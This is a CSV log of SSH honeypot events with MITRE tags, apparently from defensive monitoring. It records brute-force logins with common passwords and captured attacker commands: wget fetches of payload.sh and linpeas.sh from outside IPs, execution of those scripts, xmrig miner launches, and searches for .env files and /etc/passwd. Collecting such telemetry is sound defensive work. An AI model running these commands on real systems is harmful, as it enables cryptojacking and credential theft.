event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0003202,3343fd8d3b6d,2026-03-26T21:20:45.484Z,cowrie.login.failed,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,node,root,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003203,3343fd8d3b6d,2026-03-26T21:20:46.596Z,cowrie.login.failed,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,debian,toor,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003204,3343fd8d3b6d,2026-03-26T21:20:48.142Z,cowrie.login.failed,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,hadoop,openwrt,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003205,3343fd8d3b6d,2026-03-26T21:20:50.373Z,cowrie.session.closed,cowrie-ec2-prod-01,15.13.225.25,65087,172.18.0.3,2222,ssh,hadoop,openwrt,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,18,2065,1021,bruteforce,false,,,Known botnet C2 infrastructure
EVT-0003206,d1080de0b4b0,2026-03-30T10:28:05.000Z,cowrie.session.connect,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003207,d1080de0b4b0,2026-03-30T10:28:05.480Z,cowrie.client.version,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003208,d1080de0b4b0,2026-03-30T10:28:05.995Z,cowrie.client.kex,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003209,d1080de0b4b0,2026-03-30T10:28:06.777Z,cowrie.login.success,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,,,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003210,d1080de0b4b0,2026-03-30T10:28:26.618Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,hostname -f,0,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003211,d1080de0b4b0,2026-03-30T10:28:42.917Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,uname -a,1,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003212,d1080de0b4b0,2026-03-30T10:28:48.548Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,ls /home,2,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003213,d1080de0b4b0,2026-03-30T10:28:54.095Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,ls -la /home/ubuntu/TaskBoard/Backend/,3,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003214,d1080de0b4b0,2026-03-30T10:29:11.620Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,ls -la /home/ubuntu/TaskBoard,4,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003215,d1080de0b4b0,2026-03-30T10:29:26.347Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh,5,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,linpeas.sh,91.92.251.103,var/lib/cowrie/downloads/d82c4eb5261cb9c8aa9855edd67d1bd10482f41529858d925094d173fa662aa6,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003216,d1080de0b4b0,2026-03-30T10:29:37.701Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,chmod 777 /tmp/setup.sh,6,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003217,d1080de0b4b0,2026-03-30T10:29:40.228Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,wget http://185.220.101.42/payload.sh -O /tmp/payload.sh,7,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003218,d1080de0b4b0,2026-03-30T10:29:49.155Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,chmod +x /tmp/payload.sh && bash /tmp/payload.sh,8,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003219,d1080de0b4b0,2026-03-30T10:30:04.042Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,bash /tmp/install.sh > /dev/null 2>&1 &,9,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003220,d1080de0b4b0,2026-03-30T10:30:05.386Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,/tmp/.xmrig -o xmr-eu1.nanopool.org:14444 -u WALLET_ADDR/worker1 --tls -B,10,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003221,d1080de0b4b0,2026-03-30T10:30:12.326Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,cat /proc/cpuinfo | grep processor | wc -l,11,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003222,d1080de0b4b0,2026-03-30T10:30:24.966Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,/tmp/.xmrig -o pool.minexmr.com:4444 -u 47sbtW6oXmVKjwHjExXaAFjNMXuMUEj9VfFRhfJZqU6M9xqN1o2L3c -p x --background,12,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003223,d1080de0b4b0,2026-03-30T10:30:31.278Z,cowrie.command.input,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,logout,13,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,,,,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003224,d1080de0b4b0,2026-03-30T10:30:34.859Z,cowrie.session.closed,cowrie-ec2-prod-01,140.251.167.82,52171,172.18.0.3,2222,ssh,oracle,admin@123,true,,,TH,AS23969,TOT Public Company Limited,cryptomining,T1110.003,Brute Force: Password Spraying,medium,,,,325,31588,28036,honeypot_hit,false,,,Targeting TaskBoard API credentials
EVT-0003225,93826c7b0400,2026-04-17T18:34:01.000Z,cowrie.session.connect,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,,,,,,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003226,93826c7b0400,2026-04-17T18:34:01.496Z,cowrie.client.version,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,,,,,,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003227,93826c7b0400,2026-04-17T18:34:02.216Z,cowrie.client.kex,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,,,,,,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003228,93826c7b0400,2026-04-17T18:34:03.159Z,cowrie.login.success,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,,,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003229,93826c7b0400,2026-04-17T18:34:06.338Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,whoami,0,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003230,93826c7b0400,2026-04-17T18:34:24.516Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,id,1,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003231,93826c7b0400,2026-04-17T18:34:29.921Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,uptime,2,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003232,93826c7b0400,2026-04-17T18:34:38.883Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,sysctl -a 2>/dev/null | grep -i 'net\|kernel',3,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003233,93826c7b0400,2026-04-17T18:34:58.023Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,free -m,4,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003234,93826c7b0400,2026-04-17T18:35:02.645Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,cat /etc/hosts,5,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003235,93826c7b0400,2026-04-17T18:35:22.321Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,ifconfig,6,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003236,93826c7b0400,2026-04-17T18:35:24.172Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,arp -a,7,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003237,93826c7b0400,2026-04-17T18:35:40.899Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,top -bn1 | head -20,8,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003238,93826c7b0400,2026-04-17T18:35:43.302Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,ps -ef,9,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003239,93826c7b0400,2026-04-17T18:35:48.384Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,ls -la /home/ubuntu/TaskBoard,10,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003240,93826c7b0400,2026-04-17T18:36:04.489Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,ls /home/ubuntu/TaskBoard/frontend,11,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003241,93826c7b0400,2026-04-17T18:36:21.221Z,cowrie.command.input,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,exit,12,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,,,,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003242,93826c7b0400,2026-04-17T18:36:22.912Z,cowrie.session.closed,cowrie-ec2-prod-01,75.5.230.45,50543,172.18.0.3,2222,ssh,redis,123456789,true,,,IR,AS44244,Afranet,recon,T1082,System Information Discovery,high,,,,540,67656,55737,c2_beacon,false,,,Attempted to read .env JWT secret
EVT-0003243,d586ec9a5996,2026-03-09T16:24:03.000Z,cowrie.session.connect,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003244,d586ec9a5996,2026-03-09T16:24:03.470Z,cowrie.client.version,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003245,d586ec9a5996,2026-03-09T16:24:03.632Z,cowrie.client.kex,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003246,d586ec9a5996,2026-03-09T16:24:06.007Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,root,alpine,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003247,d586ec9a5996,2026-03-09T16:24:08.263Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,db,888888,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003248,d586ec9a5996,2026-03-09T16:24:09.495Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,ansible,raspberry,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003249,d586ec9a5996,2026-03-09T16:24:11.944Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,root,dietpi,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003250,d586ec9a5996,2026-03-09T16:24:13.172Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,debian,qwerty,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003251,d586ec9a5996,2026-03-09T16:24:13.698Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,vagrant,toor,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003252,d586ec9a5996,2026-03-09T16:24:15.279Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,pi,admin123,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003253,d586ec9a5996,2026-03-09T16:24:17.973Z,cowrie.login.failed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,ec2-user,raspberry,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,,,,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003254,d586ec9a5996,2026-03-09T16:24:19.905Z,cowrie.session.closed,cowrie-ec2-prod-01,47.206.40.252,61322,172.18.0.3,2222,ssh,ec2-user,raspberry,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,medium,,,,30,1178,1483,bruteforce,false,HIVE-1683,,Low-and-slow credential stuffing
EVT-0003255,34e4a66ae0fd,2026-04-20T01:47:06.000Z,cowrie.session.connect,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003256,34e4a66ae0fd,2026-04-20T01:47:06.144Z,cowrie.client.version,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003257,34e4a66ae0fd,2026-04-20T01:47:06.451Z,cowrie.client.kex,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003258,34e4a66ae0fd,2026-04-20T01:47:08.459Z,cowrie.login.failed,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,ubuntu,iloveyou,false,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003259,34e4a66ae0fd,2026-04-20T01:47:09.561Z,cowrie.login.failed,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,mysql,default,false,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003260,34e4a66ae0fd,2026-04-20T01:47:12.473Z,cowrie.login.success,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,,,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003261,34e4a66ae0fd,2026-04-20T01:47:32.108Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,hostname,0,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003262,34e4a66ae0fd,2026-04-20T01:47:49.028Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,who,1,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003263,34e4a66ae0fd,2026-04-20T01:47:51.836Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,uname -a,2,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003264,34e4a66ae0fd,2026-04-20T01:48:05.781Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,ls -la /root,3,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003265,34e4a66ae0fd,2026-04-20T01:48:07.913Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,ls /,4,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003266,34e4a66ae0fd,2026-04-20T01:48:22.881Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,find / -name '*.conf' -readable 2>/dev/null | head -20,5,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003267,34e4a66ae0fd,2026-04-20T01:48:25.893Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,find / -name '.env' -type f 2>/dev/null | head -10,6,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
EVT-0003268,34e4a66ae0fd,2026-04-20T01:48:31.309Z,cowrie.command.input,cowrie-ec2-prod-01,175.171.162.18,55157,172.18.0.3,2222,ssh,manager,iloveyou,true,cat /etc/passwd,7,TR,AS9121,Turk Telekomunikasyon AS,persistence,T1098.004,Account Manipulation: SSH Authorized Keys,critical,,,,,,,credential_access,false,,,Reconnaissance of NodeJS application
